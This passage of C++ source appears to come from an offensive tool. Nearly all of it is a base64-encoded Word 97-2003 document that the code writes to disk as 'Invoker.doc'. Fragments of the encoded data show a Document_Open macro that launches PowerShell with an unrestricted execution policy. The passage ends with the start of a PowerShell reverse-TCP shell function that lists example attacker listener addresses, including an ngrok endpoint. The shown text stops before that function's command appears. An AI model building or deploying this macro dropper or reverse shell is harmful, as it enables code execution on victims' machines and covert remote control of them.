AADCvLikHrdYBMCAxKQet1gEAAAAA").append("AAAAAAAAAABWAEIAQQAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAACAABAP//////////CQAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAMK8uKQ").append("et1gEwIDEpB63WAQAAAAAAAAAAAAAA").append("AFQAaABpAHMARABvAGMAdQBtAGUAbg").append("B0AAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAaAA").append("IB/////woAAAD/////AAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAABwHAAAAAAAAAQAAAAIA").append("AAADAAAABAAAAAUAAAAGAAAABwAAAA").append("gAAAAJAAAACgAAAAsAAAAMAAAADQAA").append("AA4AAAAPAAAAEAAAABEAAAASAAAAEw").append("AAABQAAAAVAAAAFgAAABcAAAAYAAAA").append("GQAAABoAAAAbAAAAHAAAAP7///8eAA").append("AAHwAAACAAAAAhAAAAIgAAACMAAAAk").append("AAAAJQAAACYAAAAnAAAA/v///ykAAA").append("AqAAAA/v///ywAAAAtAAAALgAAAC8A").append("AAAwAAAAMQAAADIAAAAzAAAANAAAAD").append("UAAAA2AAAANwAAADgAAAA5AAAAOgAA").append("ADsAAAA8AAAAPQAAAD4AAAA/AAAAQA").append("AAAEEAAABCAAAAQwAAAEQAAABFAAAA").append("RgAAAEcAAABIAAAASQAAAEoAAABLAA").append("AATAAAAE0AAABOAAAATwAAAFAAAABR").append("AAAA/v///1MAAABUAAAAVQAAAFYAAA").append("BXAAAAWAAAAFkAAABaAAAA/v///1wA").append("AABdAAAAXgAAAF8AAABgAAAAYQAAAG").append("IAAABjAAAAZAAAAGUAAABmAAAAZwAA").append("AGgAAABpAAAAagAAAGsAAABsAAAAbQ").append("AAAG4AAABvAAAAcAAAAHEAAAByAAAA").append("cwAAAHQAAAB1AAAA/v///3cAAAB4AA").append("AA/v////7///97AAAAfAAAAH0AAAB+").append("AAAAfwAAAP7///8BFgMABAABAABcBA").append("AA5AAAABICAACdBAAAqwQAAPcFAAAA").append("AAAAAQAAALHeWZMAAP//owEAAIgAAA").append("C2AP//AQEAAAAA/////wAAAAD//3AA").append("//8AAIhJGe3RYMxMtQoJC9IF27Zb0F").append("YS32OdQaSbZgrSXoeZAAAAAAAAAAAA").append("AAAAAAAAAAEAAADj3tjLJ169RrUtJW").append("/un7mIEAAAAAMAAAAFAAAABwAAAP//").append("////////AQEIAAAA/////3gAAAAI49").append("7YyydevUa1LSVv7p+5iIhJGe3RYMxM").append("tQoJC9IF27b//wAAAABNRQAA//////").append("//AAAAAP//AAAAAP//AQEAAAAA3wD/").append("/wAAAAAoAP////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("UAAAAAIAUyL/////AAABAFMQ/////w").append("AAAQBTIv////8AAAAANiL/////AAAA").append("ABoI/////wAAAAACPDAA//8AAAAAAj").append("w4AP//AAAAAAI8/////wAA//8BAQAA").append("AAABACgAMQBOAG8AcgBtAGEAbAAuAF").append("QAaABpAHMARABvAGMAdQBtAGUAbgB0").append("AAkAAAAAAEAAAAABAbgBAAACgP7///").append("///yAAAAD/////MAAAAAIB//8AAAAA").append("AAAAAP//////////AAAAAAAAAAAdAA").append("AAJQAAAP////8oAQAAsAAAAEgAAAD4").append("/////////wgA//8gAAAA/////xAAAA").append("D/////AAAAAAAAAAABAAAAsAAAABgA").append("AADg/////////wwA//8gAAAAsAAAAA").append("AAAABpg/7/////////////////////").append("/wAAAAD/////IAAAAP////8AAAAAAo").append("P+//////8AAAAA/////+gAAAAAAP//").append("/////wAAAAD//////////wAAAAAAAA").append("AAHQAYACUAAACCoCQC//////7/////").append("////IAEAAAIA///+////AAAAAP////").append("//////AAAAAAAAAAAdABgAJQAAAAsR").append("MAL/////AAAEYAAAAAD//////////w").append("AAAAAAAAAAAAAAAAAAAAD/////AAAA").append("AEgAAAAAAAAA/////xgAAAAIDgAABA").append("AEAAAAAAAAAAAAnAAAAQAAAABpg/7/").append("/////////////////////wAAAAD///").append("//IAAAAP////9YAgAA/////6ABAAD/").append("////qAEAAAEAAQAAAAEAAAAAAAAAAA").append("AoAQAA//////////8AAAAA////////").append("//8oAQAA//////////8AAAAA//////").append("//////////8AAAALgAAAAAAAAAAAAA").append("AHgAAAAIAAAAAAAQDggO//////////").append("///////////////////xAAAAACADgA").append("AACpoIdhDAABJAAqAFwAUgBmAGYAZg").append("BmACoAMAA3ADYAMQA4ADcAYQAwAGEA").append("OQABEAAqAFwAUgAwACoAIwAxADcA3w").append("EAAAAAAP////9gAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAA/soBAAQAIoEIAAYABgAAAA").append("AAAIEIBB4AQAAQAAAAAIEIBIoAAAA4").append("AAAABIEIAAIACAAIAAAA/////wEB0A").append("AAAJYEKAEAAAAAbwD//2AAAAC5AAEA").append("QwC5AAEATQALALkAAQBEAAsAHQBBQD").append("ICAQAAAP////9IAAAAuQAFAFBvd2Vy").append("ALkABQBTaGVsbAALALkAAQAgAAsAuQ").append("ABAC0ACwC5AAkARXhlY3V0aW9uAAsA").append("uQAGAFBvbGljeQsAuQABACAACwC5AA").append("wAVW5yZXN0cmljdGVkCwC5AAEAIAAL").append("ALkAAQAtAAsAuQACAE5vCwC5AAcAUH").append("JvZmlsZQALAB0AQUAyAgEAAAAAAAAA").append("/////6AAAAD/////AAABG7EAQXR0cm").append("lidXQAZSBWQl9OYW0AZSA9ICJUaGkA").append("c0RvY3VtZW4QdCINCgqMQmFzAQKMMU").append("5vcm1hbAIuGVZHbG9iYWwhAapTcGFj").append("AWxGYQhsc2UMokNyZWEQdGFibBUfUH").append("JlIGRlY2xhAAZJZBEAnlRydQ1CRXhw").append("CG9zZRQcVGVtcABsYXRlRGVyaQJ2FS").append("RDdXN0b21saXqEQ4MxUAAYABwgEFN1").append("YiCFh19PcIBlbigpDQogAAAAU2hlbG").append("wgKCKAQyIgKyAiTYICBEQiDA5Qb3dl").append("clcCDQIXggQgggItggJFAHhlY3V0aW").append("9ugYIGUG9saWN5AgVBAxJVbnJlcwDS").append("Y5h0ZWQIC4MdTm8CCYBQcm9maWxlgT").append("wIRW5kgVcNCgAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAH").append("JVgAAAAAAAAAAAAAAAAAAAAEAAAAAA").append("AAAAQAAAAAAAAAAAAAAAAAAAADgAAA").append("AAAAAAEQAAAAAAAAAAAAAAEQAAAAAA").append("AAAAAAMAUAAAAAAAAAAAAAAAAQABAA").append("QAAABBCQAAAAAAAAAAAACxCAAAAAAA").append("AAAAAADRCAAAAAAAAAAAAADxCAAAAA").append("AAAAAAAAABAAEAAAABAHEHAAAAAAAA").append("AAAAAKEHAAAAAAAAAAAAANEHAAAAAA").append("AAAAAAABEAAAAAAF8AXwBTAFIAUABf").append("ADIAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAQAAIBDQAAAP////////").append("//AAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAHQAAAKQCAA").append("AAAAAAXwBfAFMAUgBQAF8AMwAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("ABAAAgEMAAAABwAAAP////8AAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAoAAAAnAAAAAAAAABfAF").append("YAQgBBAF8AUABSAE8ASgBFAEMAVAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAGgACAP//").append("/////////////wAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("ACsAAACyCQAAAAAAAGQAaQByAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAIAAIB////////////").append("////AAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAUgAAAAEC").append("AAAAAAAAAAABAAIAQQcAAAAAAAAAAA").append("AACAANAGAAAADhAwAAAAAAAAAAAACx").append("AAAAAAAAAAAAAQARCAAAAAAAAAAAAA").append("D///////////////8BAAUAAAAAAARg").append("aQQAAAAAAAAAAAIA//////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("/////////////////////////////w").append("EAugHpAgAAAAAAAAAAAgCoAAAAAAAA").append("AFAAAAAAAAAAZwIGAAAAZwJAAAAA8A").append("UCAAAA9wUBAPcFAgBQAWcD+P////cF").append("AwBQAXED4P////0EAAAQAL0C2P///7").append("0D+P///7wD4P///2cCAAAAAPgBMwAA").append("AAAAAAAAAAgAKABQAAAAOAAAAAgAAA").append("AAAAAAAAAAAAAAAAAUAAAAAAAAAAAA").append("AAAAAAAAAAAAACAAAAAAAAAAAAACAA").append("AAAAAAAAAA+P///wEA4P///wIAFAAA").append("AAAAABMAAGAAkQIAAAAAAAAAAAIAEQ").append("QAAAAAAAAAAAIAIAAAAAAAAA4AAVoA").append("AggMAAAAAAAAfyAAAAAAAAAOAAFaAA").append("IIXAAAAAAAAH8AAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("ByVUAAAAAAAAAAAAAAAAAAAABAAAAA").append("AAAAAEAAAAAAAAAAAAAAAAAAAAAaAA").append("AAAAAAABEAAAAAAAAAAAACAP//////").append("/////////wAAAAB4AAAACAA4AOEBAA").append("AAAAAAAAACAAAABGAAAAgOOAD/////").append("////////////////AAAAAAAAAAAfAA").append("AAAAAAAGIAAAAAAAB/AAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAADMYbIAAAMA/xoE").append("AAAJBAAA4gQDAAAAAAAAAAAAAQAFAA").append("IAIAEqAFwARwB7ADAAMAAwADIAMAA0").append("AEUARgAtADAAMAAwADAALQAwADAAMA").append("AwAC0AQwAwADAAMAAtADAAMAAwADAA").append("MAAwADAAMAAwADAANAA2AH0AIwA0AC").append("4AMgAjADkAIwBDADoAXABQAHIAbwBn").append("AHIAYQBtACAARgBpAGwAZQBzAFwAQw").append("BvAG0AbQBvAG4AIABGAGkAbABlAHMA").append("XABNAGkAYwByAG8AcwBvAGYAdAAgAF").append("MAaABhAHIAZQBkAFwAVgBCAEEAXABW").append("AEIAQQA3AC4AMQBcAFYAQgBFADcALg").append("BEAEwATAAjAFYAaQBzAHUAYQBsACAA").append("QgBhAHMAaQBjACAARgBvAHIAIABBAH").append("AAcABsAGkAYwBhAHQAaQBvAG4AcwAA").append("AAAAAAAAAAAAAAAaASoAXABHAHsAMA").append("AwADAAMgAwADkAMAA1AC0AMAAwADAA").append("MAAtADAAMAAwADAALQBDADAAMAAwAC").append("0AMAAwADAAMAAwADAAMAAwADAAMAA0").append("ADYAfQAjADgALgA3ACMAMAAjAEMAOg").append("BcAFAAcgBvAGcAcgBhAG0AIABGAGkA").append("bABlAHMAXABNAGkAYwByAG8AcwBvAG").append("YAdAAgAE8AZgBmAGkAYwBlAFwAcgBv").append("AG8AdABcAE8AZgBmAGkAYwBlADEANg").append("BcAE0AUwBXAE8AUgBEAC4ATwBMAEIA").append("IwBNAGkAYwByAG8AcwBvAGYAdAAgAF").append("cAbwByAGQAIAAxADYALgAwACAATwBi").append("AGoAZQBjAHQAIABMAGkAYgByAGEAcg").append("B5AAAAAAAAAAAAAAAAALwAKgBcAEcA").append("ewAwADAAMAAyADAANAAzADAALQAwAD").append("AAMAAwAC0AMAAwADAAMAAtAEMAMAAw").append("ADAALQAwADAAMAAwADAAMAAwADAAMA").append("AwADQANgB9ACMAMgAuADAAIwAwACMA").append("QwA6AFwAVwBpAG4AZABvAHcAcwBcAF").append("MAeQBzAHQAZQBtADMAMgBcAHMAdABk").append("AG8AbABlADIALgB0AGwAYgAjAE8ATA").append("BFACAAQQB1AHQAbwBtAGEAdABpAG8A").append("bgAAAAAAAAAAAAAAAAASACoAXABDAE").append("4AbwByAG0AYQBsABIAKgBcAEMATgBv").append("AHIAbQBhAGwAqKCHYQgAAAAAAAAAKA").append("EqAFwARwB7ADIARABGADgARAAwADQA").append("QwAtADUAQgBGAEEALQAxADAAMQBCAC").append("0AQgBEAEUANQAtADAAMABBAEEAMAAw").append("ADQANABEAEUANQAyAH0AIwAyAC4AOA").append("AjADAAIwBDADoAXABQAHIAbwBnAHIA").append("YQBtACAARgBpAGwAZQBzAFwAQwBvAG").append("0AbQBvAG4AIABGAGkAbABlAHMAXABN").append("AGkAYwByAG8AcwBvAGYAdAAgAFMAaA").append("BhAHIAZQBkAFwATwBGAEYASQBDAEUA").append("MQA2AFwATQBTAE8ALgBEAEwATAAjAE").append("0AaQBjAHIAbwBzAG8AZgB0ACAATwBm").append("AGYAaQBjAGUAIAAxADYALgAwACAATw").append("BiAGoAZQBjAHQAIABMAGkAYgByAGEA").append("cgB5AAAAAAAAAAAAAAAAAAEAAgAGAB").append("ICAAAUAgEAFgIBABgCAAAaAgEAHAIB").append("ACIC////////AAAAAAAAAACpoIdhDA").append("D///////////////////////8AAP//").append("//////////////////////////////").append("//////////////////////////AQAA").append("AAAAAAAAAAAAAAAAAAAAAACx3gEAGA").append("BUAGgAaQBzAEQAbwBjAHUAbQBlAG4A").append("dAAUADAANwA2ADEAOAA3AGEAMABhAD").append("kA//8lAhgAVABoAGkAcwBEAG8AYwB1").append("AG0AZQBuAHQA//9ZkwAAAAAAAAACAA").append("AA/QUAAP///////wEBIAIAAP//////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("/wACAAD///////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("////////////////6euWjHl8y0acuu").append("UBo+9Sw/////8BAAAA/////2AAAACA").append("AAAAAAAeARgABgHULAAABAxXb3JktW").append("sQAAMMVkJB9+IQAAUEV2luMTbBfhAA").append("BQRXaW4zMgd/EAAFBFdpbjY0eH8QAA").append("METWFjs7IQAAQEVkJBNq0jEAAEBFZC").append("QTeuIxAACARQcm9qZWN0MQoXEAAGDH").append("N0ZG9sZZNgEAAHDFByb2plY3QtrhAA").append("DAxUaGlzRG9jdW1lbnQ8nhAACYAAAP").append("8DAwBfRXZhbHVhdGUY2RAABghOb3Jt").append("YWzf2BAABowoAP8DAwBPZmZpY2UVdR").append("AACAREb2N1bWVudGrTEAAMBERvY3Vt").append("ZW50X05ldztFEAANBERvY3VtZW50X0").append("9wZW7BiRAABQBTaGVsbFbXEAAGgAAA").append("/wMDAFBvbGljeQhPEAAMgAAA/wMDAF").append("VucmVzdHJpY3RlZH5lEAAJgAAA/wMD").append("AE5vUHJvZmlsZeBvEAAJgAAA/wMDAE").append("V4ZWN1dGlvbqrbEAAHgAAA/wMDAFBy").append("b2ZpbGUYrhAAAv//AQFUAAAA//////").append("//////////////////////////////").append("////////////IAICAP//IgL/////JQ").append("IAAAgA////////KAIDAP//DgIBAP//").append("EAIAAP//KgIEAP//CAAOAAAAAQASAA").append("AAAAAAAAAAAAAAAAAAAAAAAAEAAAAA").append("AAAAAAAAAAAAAAAB/bGAAQAEAAAAAw").append("AwKgICkAkAcBQGSAMAggIAZOIEBAAH").append("ABwAUHJvamVjdAVRACgAAEACFAYCFD").append("2tAgoHAmwBFAgGEgkCEoCpoIdhDAAM").append("AkoSPAIKFgABcnN0ZBBvbGU+AhlzAH").append("QAAGQAbwBsAGVQAA0AaAAlXgADKgBc").append("R3swMDAyMLA0MzAtAAgEBEMACgMCDg").append("ESMDA0Nn0jADIuMCMwI0M6AFxXaW5k").append("b3dzAFxTeXN0ZW0zBDJcA2UyLnRsYg").append("AjT0xFIEF1dIBvbWF0aW9uAGADAAKD").append("RU5vcm1hbAWDRU6AQ3IAbQBhUYBGDg").append("AggBEJgAEqLFxDAxIKBqiAbQgAQYMh").append("T2ZmaWOEZ09EAGaAAGkAY4JnngWAH5").append("SCIUd7MkRGADhEMDRDLTVCAEZBLTEw").append("MUItkEJERTWAZ0FBgGUaNIAFMohngL").append("pncmEAbSBGaWxlc1xAQ29tbW9uBAZN").append("AGljcm9zb2Z0ACBTaGFyZWRcAE9GRk").append("lDRTE2AFxNU08uRExMBiOHEINNIDE2").append("LjAIIE9igeMgTGlisHJhcnmAJYAAD4").append("J6iAEAE8IBsd4ZQmUAVGhpc0RvY3WA").append("bWVudEcAGMAJglTAZmkAcwBEwEiIYw").append("B1QEllAG7Abioazgsy2gscwBIAAKpI").append("QgExQon9AJYeQgJFAQUswiFZkyJCCC").append("sFQgEQQgEAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AACTSyqyAwAQAAAA//8AAAAAAQACAP").append("//AAAAAAEAAAAAAAAAAAABAAIAAAAA").append("AAAAAQAFAAUABQAFAAUABQAFAAUABQ").append("AFAAUABQABAAkAAAAqXENOb3JtYWxy").append("VcAAAAAAAAAAQAAAAAAAAABAAAAAAA").append("AAAEAAAAAAAAAABgAAAAAAAH4KAAAA").append("AAAAfgIAAAAAAAB+AgAAAAAAAH4CAA").append("AAAAAAfgIAAAAAAAB+BgAAAAAAAH5S").append("AAAAAAAAfwAAAAAAAAAAIgAAAAAAAA").append("ARAAAAAAAAAAAAAQAQAAAAAAAAAAAA").append("AABhAQAAAAAAAAAAAAAWvPsc0bWLS6").append("G3UOeti0E3AQAJBAAAGgQAAOIEAAAA").append("AAAAAQD//////////wEAgwpFABEAAA").append("AAAAAAAAACAHEIAAAAAAAAAAAAAP//").append("////////AV8AXwBTAFIAUABfADAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAQAAIACwAAAAgAAAD/////AAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAWwAAAIcGAAAAAAAA").append("XwBfAFMAUgBQAF8AMQAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAABAAAg").append("D///////////////8AAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAB2AAAArgAAAAAAAABQAFIATwBK").append("AEUAQwBUAHcAbQAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAFAACAP////////").append("///////wAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAHkAAA").append("ApAAAAAAAAAFAAUgBPAEoARQBDAFQA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAQAAIBBgAAAA4AAAD/////AA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAegAAAHsBAAAAAA").append("AAAEEIAAAAAAAAAAAAAP//AAAxAQAA").append("AAAAAAAAAAAFAHECAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAARBAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAQQ").append("UAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAABEAAAAAAAAAAQAAALTxCLE2oA").append("BJrNQJR/gyM+2xBgAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAABAAAAAAAAA").append("IMAAAAAAAAAFRoaXNEb2N1bWVudAIA").append("AAAAAAACBwAAAAAAAABQcm9qZWN0BA").append("AAAAAAAAPvBAIAAAAAAMAAAAAAAABG").append("EgAAAAAAAAJCAAAAAAAAAEM6XFByb2").append("dyYW0gRmlsZXNcQ29tbW9uIEZpbGVz").append("XE1pY3Jvc29mdCBTaGFyZWRcVkJBXF").append("ZCQTcuMVxWQkU3LkRMTAIAAAAAAAAC").append("AwAAAAAAAABWQkEQAAAAAAAACoEBAA").append("AAAAAAAAAAAP//////////BAACAAkA").append("AACxAQAAAAAAAAAAAABRAgAAAAAAAA").append("AAAACwAAAAAAAAAAAAAAAAAAAAAAAE").append("AAAAAAAAAwUJAgAAAAAAwAAAAAAAAE").append("YQAAAAAAAAAjoAAAAAAAAAQzpcUHJv").append("Z3JhbSBGaWxlc1xNaWNyb3NvZnQgT2").append("ZmaWNlXHJvb3RcT2ZmaWNlMTZcTVNX").append("T1JELk9MQgIAAAAAAAACBAAAAAAAAA").append("BXb3JkBAAAAAAAAAMCCgIAAAAAAMAA").append("AAAAAABGEAAAAAAAAAoBAwAAAAAAAA").append("AAAAD//////////wgABwAAAAAAMQMA").append("AAAAAAAAAAAAwQMAAAAAAAAAAAAA0A").append("AAAAAAAAAAAAAAAAAAAAAABAAAAAAA").append("AAMwBAIAAAAAAMAAAAAAAABGCAAAAA").append("AAAAIfAAAAAAAAAEM6XFdpbmRvd3Nc").append("U3lzdGVtMzJcc3Rkb2xlMi50bGICAA").append("AAAAAAAgYAAAAAAAAAc3Rkb2xlEAAA").append("AAAAAAqhBAAAAAAAAAAAAAD///////").append("///wIAAAAAAAAA0QQAAAAAAAAAAAAA").append("IQUAAAAAAAAAAAAA8AAAAAAAAAAAAA").append("AAAAAAAAAABAAAAAAAAANM0Pgt+lsb").append("EL3lAKoARN5SEAAAAAAAAAI/AAAAAA").append("AAAEM6XFByb2dyYW0gRmlsZXNcQ29t").append("bW9uIEZpbGVzXE1pY3Jvc29mdCBTaG").append("FyZWRcT0ZGSUNFMTZcTVNPLkRMTAIA").append("AAAAAAACBgAAAAAAAABPZmZpY2UQAA").append("AAAAAACtEFAAAAAAAAAAAAAP//////").append("////AgAIAAAAAAABBgAAAAAAAAAAAA").append("CRBgAAAAAAAAAAAAAQAQAAAAAAAAAA").append("AAAAAAAAAAAEAAAAAAAAA2sJAgAAAA").append("AAwAAAAAAAAEYEAAAAAAAAA4hJGe3R").append("YMxMtQoJC9IF27YEAAAAAAAAA1vQVh").append("LfY51BpJtmCtJeh5kGAAAAAAAAA+Pe").append("2MsnXr1GtS0lb+6fuYgEAAAAAAAAAg").append("gAAAAAAAAARG9jdW1lbnQEAAAAAAAA").append("Ag0AAAAAAAAARG9jdW1lbnRfT3Blbg").append("YAAAAAAAANFAAUAAAAeAAAAAAAAAAA").append("AAAAAAAAAAIAAAAAAAALAgAAAEMAAg").append("AAAAAAAAsCAAAATQACAAAAAAAACwIA").append("AABEAAQAAAAAAAACCAAAAAAAAABWQk").append("U3LkRMTA4AAAAAAAAHEQkAAAAAAAAA").append("AAAA//////////9YAgsAwQkAAAAAAA").append("AAAAAAMAEAAAAAAAAAAAAAIAAAAAAA").append("AA4CAmEABAgCJgAAAAAAAH8AAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAHJVQAAAAAAA").append("AABAAAAAAAAAAEAAAAAAAAAAQAAAAA").append("AAAAACAAAAAAAAfnoAAAAAAAB/AAAA").append("AAAAAAASAAAAAAAAABEAAAAAAAAAAA").append("AAAP//////////////////////////").append("AAAAABEAAAAAAAAAAAADAAYAAAAAAA").append("AJEQQAAAAAAAAAAAAA4QMAAAAAAAAA").append("AAAAEAAAAAAAAAAAAAEAYgAAAAAAAH").append("8AAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAFRoaXNEb2N1bWVudABUAGgAaQ").append("BzAEQAbwBjAHUAbQBlAG4AdAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("BJRD0iezYwOTVFMTkwLUU5ODEtNDJB").append("QS1COURBLTJGRUM1NEFFMTUyQ30iDQ").append("pEb2N1bWVudD1UaGlzRG9jdW1lbnQv").append("JkgwMDAwMDAwMA0KTmFtZT0iUHJvam").append("VjdCINCkhlbHBDb250ZXh0SUQ9IjAi").append("DQpWZXJzaW9uQ29tcGF0aWJsZTMyPS").append("IzOTMyMjIwMDAiDQpDTUc9Ijc1Nzc4").append("REVFOEY2QjkzNkI5MzZCOTM2QjkzIg").append("0KRFBCPSJGNkY0MEU2RDBFNkY4RTcw").append("OEU3MDhFIg0KR0M9Ijc3NzU4RkVDOT").append("FFQzEzRUQxM0VERUMiDQoNCltIb3N0").append("IEV4dGVuZGVyIEluZm9dDQomSDAwMD").append("AwMDAxPXszODMyRDY0MC1DRjkwLTEx").append("Q0YtOEU0My0wMEEwQzkxMTAwNUF9O1").append("ZCRTsmSDAwMDAwMDAwDQoNCltXb3Jr").append("c3BhY2VdDQpUaGlzRG9jdW1lbnQ9Mz").append("IsIDMyLCAxNDc0LCA2NzksIA0KAAAA").append("AAABAEMAbwBtAHAATwBiAGoAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAEg").append("ACAP///////////////wAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAIAAAAByAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAA//////").append("//////////AAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAD///////////////").append("8AAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAP///////////////wAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAIEAAA").append("D+////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////AQD+/wMKAAD/").append("////BgkCAAAAAADAAAAAAAAARiAAAA").append("BNaWNyb3NvZnQgV29yZCA5Ny0yMDAz").append("IERvY3VtZW50AAoAAABNU1dvcmREb2").append("MAEAAAAFdvcmQuRG9jdW1lbnQuOAD0").append("ObJxAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAA=");
	CreateFile("Invoker.doc", base64_decode(encoded));
}

void PS_ReverseTCP() {
	Output("################################# EXAMPLES #################################");
	Output("# IP   : 192.168.8.5                                                       #");
	Output("# Port : 9000                                                              #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Address : 2.tcp.ngrok.io                                                 #");
	Output("# Port    : 11650                                                          #");
	Output("############################################################################");
	Output("");
	// NOTE: PowerShell encoded command.
	// NOTE: More about the script at github.com/ivan-sincek/powershell-reverse-tcp.
